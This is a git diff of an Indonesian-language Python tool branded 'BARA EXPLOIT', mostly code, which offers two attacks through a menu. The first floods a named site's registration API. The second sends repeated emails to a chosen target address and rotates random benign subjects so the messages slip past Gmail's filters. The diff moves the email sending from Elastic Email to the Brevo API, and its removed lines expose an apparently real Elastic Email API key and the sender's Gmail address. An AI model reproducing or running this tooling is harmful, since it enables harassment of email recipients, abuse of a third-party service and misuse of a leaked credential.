@@ -21,11 +21,11 @@ except ImportError:
 TARGET_URL = "https://nova-wawa.vercel.app/api/register"
 USED_KEYS_FILE = "used_keys.txt"
 
-# --- KONFIGURASI ELASTIC EMAIL ---
-ELASTIC_API_KEY = "562C11AA704AB0FE5531510AEB2A543E54DCF8AB01DDA7D0F3F57A6889B337C2B23B553D3C67DE34D33B068BDAC3811B"
-ELASTIC_SENDER_EMAIL = "ttingg48@gmail.com"
-ELASTIC_SENDER_NAME = "BARA EXPLOIT"
-ELASTIC_API_URL = "https://api.elasticemail.com/v4/emails/transactional"
+# --- KONFIGURASI BREVO (GANTI API KEY BARU LO) ---
+BREVO_API_KEY = "xkeysib-GANTI_PAKE_API_KEY_BARU_LO" 
+BREVO_API_URL = "https://api.brevo.com/v3/smtp/email"
+BREVO_SENDER_EMAIL = "ttingg48@gmail.com" 
+BREVO_SENDER_NAME = "BARA EXPLOIT"
 
 # Kode Warna ANSI
 C_RED = '\033[91m'
@@ -140,9 +140,9 @@ def eksekusi_spam(jumlah):
     print(f"{C_GREEN}[✅] SPAM SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")
 
 # ==========================================
-# MENU 2: SPAM EMAIL (ELASTIC EMAIL API)
+# MENU 2: SPAM EMAIL (BREVO API V3)
 # ==========================================
-def kirim_email_elastic(target, pesan):
+def kirim_email_brevo(target, pesan):
     # UI HTML Sederhana (Biar Gmail Ga Curiga)
     html_content = f"""
     <!DOCTYPE html>
@@ -159,39 +159,26 @@ def kirim_email_elastic(target, pesan):
     </html>
     """
 
-    # Subjek Aman
     subjek_aman = random.choice([
         "Pesan Penting", "Halo, ada info buat kamu", 
         "Update Terbaru", "Cek ini", "Informasi"
     ])
 
-    # FORMAT FINAL: RECIPIENTS = ARRAY OF OBJECTS
     payload = {
-        "Recipients": [
-            {
-                "Email": target,
-                "Fields": {}
-            }
-        ],
-        "Content": {
-            "From": f"{ELASTIC_SENDER_NAME} <{ELASTIC_SENDER_EMAIL}>",
-            "Subject": f"{subjek_aman} {random.randint(100, 999)}",
-            "Body": [
-                {
-                    "ContentType": "HTML",
-                    "Content": html_content
-                }
-            ]
-        }
+        "sender": {"name": BREVO_SENDER_NAME, "email": BREVO_SENDER_EMAIL},
+        "to": [{"email": target}],
+        "subject": f"{subjek_aman} {random.randint(100, 999)}",
+        "htmlContent": html_content
     }
 
     headers = {
-        "Content-Type": "application/json",
-        "X-ElasticEmail-ApiKey": ELASTIC_API_KEY
+        "accept": "application/json",
+        "content-type": "application/json",
+        "api-key": BREVO_API_KEY
     }
 
     try:
-        res = requests.post(ELASTIC_API_URL, headers=headers, json=payload, timeout=10)
+        res = requests.post(BREVO_API_URL, headers=headers, json=payload, timeout=10)
         if res.status_code in [200, 201, 202]:
             return True, "OK"
         else:
@@ -201,7 +188,7 @@ def kirim_email_elastic(target, pesan):
 
 def eksekusi_spam_email():
     clear()
-    print(f"{C_CYAN}=== SPAM EMAIL (ELASTIC EMAIL) ==={C_RESET}")
+    print(f"{C_CYAN}=== SPAM EMAIL (BREVO API) ==={C_RESET}")
     target = input(f"{C_YELLOW}Email Target: {C_RESET}")
     pesan = input(f"{C_YELLOW}Pesan: {C_RESET}")
     try:
@@ -212,7 +199,7 @@ def eksekusi_spam_email():
     print(f"\n{C_YELLOW}[*] Memproses...{C_RESET}")
     sukses = 0
     for i in range(1, jumlah + 1):
-        berhasil, error_msg = kirim_email_elastic(target, pesan)
+        berhasil, error_msg = kirim_email_brevo(target, pesan)
         if berhasil:
             sukses += 1
             print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
@@ -258,7 +245,7 @@ def main():
                 BARA EXPLOIT - MAIN MENU
 ======================================================
 {C_YELLOW}1. {C_WHITE}Spam Register (Nova Wawa)
-{C_YELLOW}2. {C_WHITE}Spam Email (Elastic Email)
+{C_YELLOW}2. {C_WHITE}Spam Email (Brevo API)
 {C_YELLOW}0. {C_WHITE}Keluar
 {m_c}======================================================
 {C_WHITE}Dev: BARA | Key: {user_key[:5]}***{C_RESET}""")
